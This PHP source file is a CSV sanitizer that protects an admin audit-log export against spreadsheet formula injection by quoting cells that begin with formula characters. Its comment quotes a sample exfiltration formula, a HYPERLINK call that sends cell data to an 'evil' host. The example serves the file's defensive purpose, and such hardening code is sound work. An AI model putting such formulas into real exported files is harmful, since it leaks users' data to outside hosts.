<?php

/**
 * FILE: src/Service/CsvSanitizer.php
 * WHAT: small helper that makes a value safe before it is written in a CSV file.
 * ROLE IN THE PROJECT: the defence against CSV injection (formula injection).
 * USED BY: Admin\AuditController::export (admin downloads the audit log as CSV). Tested by tests/Unit/CsvSanitizerTest.
 */

namespace App\Service;

/**
 * Protection against CSV injection ("formula injection", OWASP).
 *
 * Spreadsheet applications treat a cell starting with = + - @ (and, in some versions, a TAB or CR) as a formula.
 * Attacker-controlled values end up in the audit log (an "email" typed on the login form, a User-Agent header,
 * a product name...). Without this, opening the export could run =HYPERLINK("http://evil/?"&A1) or a DDE payload on
 * the admin's computer. Prefixing such cells with a single quote makes the spreadsheet display them as plain text.
 */
final class CsvSanitizer
{
    // A cell that starts with one of these characters is read as a formula by Excel / LibreOffice.
    private const DANGEROUS_FIRST_CHARS = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Makes ONE cell safe.
     * SECURITY: CSV injection - a value starting with = + - @ gets a leading quote ('), so the spreadsheet shows it
     * as text instead of running it as a formula.
     *
     * @param string $value the raw value
     *
     * @return string the safe value
     */
    public static function cell(string $value): string
    {
        // Control characters (except tab/newline handled by the CSV quoting) are removed.
        $value = (string) preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $value);

        if ('' !== $value && in_array($value[0], self::DANGEROUS_FIRST_CHARS, true)) {
            return "'".$value;
        }

        return $value;
    }

    /**
     * Makes every cell of a row safe (calls cell() on each value).
     *
     * @param list<string> $row
     *
     * @return list<string>
     */
    public static function row(array $row): array
    {
        return array_map(self::cell(...), $row);
    }
}
